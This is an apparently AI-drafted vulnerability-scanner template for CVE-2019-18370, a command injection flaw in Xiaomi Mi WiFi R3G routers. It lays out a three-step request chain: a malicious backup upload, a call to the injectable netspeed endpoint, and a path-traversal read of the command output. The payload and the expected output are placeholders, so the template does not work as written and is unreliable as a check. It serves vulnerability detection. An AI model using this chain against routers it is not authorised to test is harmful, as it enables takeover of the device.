id: CVE-2019-18370

info:
  name: Xiaomi Mi WiFi R3G Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered on Xiaomi Mi WiFi R3G devices before 2.28.23-stable. The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress, so one can control the contents of the files in the decompressed directory. In addition, the application's sh script for testing upload and download speeds reads a URL list from /tmp/speedtest_urls.xml, and there is a command injection vulnerability, as demonstrated by api/xqnetdetect/netspeed.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary commands on the device.
  remediation: |
    Update the firmware to the latest version provided by Xiaomi to mitigate the vulnerability.
  reference:
    - https://github.com/YIXINSHUWU/Penetration_Testing_POC
    - https://github.com/huike007/penetration_poc
    - https://github.com/tomsiwik/xiaomi-router-patch
    - https://github.com/Tyro-Shan/gongkaishouji
    - https://github.com/hasee2018/Penetration_Testing_POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-18370
    cwe-id: CWE-78
    epss-score: 0.00799
    epss-percentile: 0.82296
    cpe: cpe:2.3:o:mi:millet_router_3g_firmware:*:*:*:*:*:*:*:*
  metadata:
    vendor: mi
    product: millet_router_3g_firmware

http:
  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/luci/;stok={{stok}}/api/misystem/c_upload"

    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="payload.tar.gz"
      Content-Type: application/x-gzip

      <binary content of payload.tar.gz>
      ------WebKitFormBoundary--

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
    matchers:
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/luci/;stok={{stok}}/api/xqnetdetect/netspeed"

    matchers:
      - type: word
        words:
          - "success"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/api-third-party/download/extdisks../tmp/1.txt"

    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "command_output_here"
        part: body
